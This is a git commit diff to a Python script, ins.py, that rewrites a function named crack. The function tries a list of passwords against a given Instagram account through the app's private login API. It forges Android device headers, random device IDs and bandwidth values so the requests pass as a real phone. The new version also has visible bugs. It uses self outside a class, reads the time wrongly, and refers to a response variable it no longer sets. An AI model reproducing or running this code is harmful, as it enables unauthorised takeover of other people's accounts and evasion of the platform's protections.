4ccf807cdbe9f714685ba1e7ce92992ba2ab4aed
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-12-10 21:18:42 +0530

    Update ins.py

--- ins.py
+++ ins.py
@@ -222,47 +222,43 @@ def crack(uid, pww, total_idz):
     sys.stdout.flush()
     try:
         for pw in pww:
-            session = requests.Session()
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            x_mid = generate_x_mid()
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
+            byps = requests.Session()
             headers = {
-          'host': 'b.i.instagram.com',
-          'x-ig-app-locale': 'in_ID',
-          'x-ig-device-locale': 'in_ID',
-          'x-ig-mapped-locale': 'id_ID',
-          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
-          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
-          'x-ig-bandwidth-speed-kbps': '-1.000',
-          'x-ig-bandwidth-totalbytes-b': '0',
-          'x-ig-bandwidth-totaltime-ms': '0',
-          'x-bloks-version-id': Blok_ID(),
-          'x-bloks-is-prism-enabled': 'false',
-          'x-bloks-is-layout-rtl': 'false',
-          'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
-          'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
-          'x-ig-android-id': 'android-4aca695260085376',
-          'x-ig-timezone-offset': str(timezone_offset()),
-          'x-fb-connection-type': 'MOBILE.LTE',
-          'x-ig-connection-type': 'MOBILE(LTE)',
-          'x-ig-capabilities': '3brTv10=',
-          'x-ig-app-id': '3419628305025917',
-          'priority': 'u=3',
-          'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
-          'accept-language': 'id-ID, en-US',
-          'x-mid': x_mid,
-          'ig-intended-user-id': '0',
-          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-          'content-length': '3146',
-          'x-fb-http-engine': 'Liger',
-          'x-fb-client-ip': 'True',
-          'x-fb-server-cluster': 'True'
-       }
-            DataRec = {'params': '{"client_input_params":{"contact_point":"'+uid+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'","event_flow":"account_recovery","family_device_id":"'+str(uuid.uuid4())+'","machine_id":"'+ x_mid +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(uuid.uuid4())+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(uuid.uuid4())+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+Blok_ID()+'","styles_id":"instagram"}','bloks_versioning_id': Blok_ID()}
-            Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(DataRec['params']), urllib.parse.quote(DataRec['bk_client_context']), DataRec['bloks_versioning_id'])
-            Respons = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=Query,headers=headers,allow_redirects=True)
+                    'host': 'i.instagram.com',
+                    'x-ig-app-locale': 'in_ID',
+                    'x-ig-device-locale': 'in_ID',
+                    'x-ig-mapped-locale': 'id_ID',
+                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
+                    'x-ig-www-claim': '0',
+                    'x-bloks-is-prism-enabled': 'false',
+                    'x-bloks-is-layout-rtl': 'false',
+                    'x-ig-device-id': str(uuid.uuid4()),
+                    'x-ig-family-device-id': str(uuid.uuid4()),
+                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
+                    'x-fb-connection-type': 'MOBILE.LTE',
+                    'x-ig-connection-type': 'MOBILE(LTE)',
+                    'x-ig-capabilities': '3brTv10=',
+                    'priority': 'u=3',
+                    'user-agent': useragent,
+                    'accept-language': 'id-ID, en-US',
+                    'x-mid': '',
+                    'ig-intended-user-id': '0',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
+                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
+                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
+                    'x-ig-app-id': '3419628305025917',
+                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
+                    'connection': 'keep-alive'
+                }
+            encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(pw))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(uid))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
+            headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
+            response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, headers = headers, allow_redirects=True).text
             print("STATUS:", Respons.status_code)
             print("RESPONSE:", Respons.text)
             if 'logged_in_user' in Respons.text.replace('\\',''):
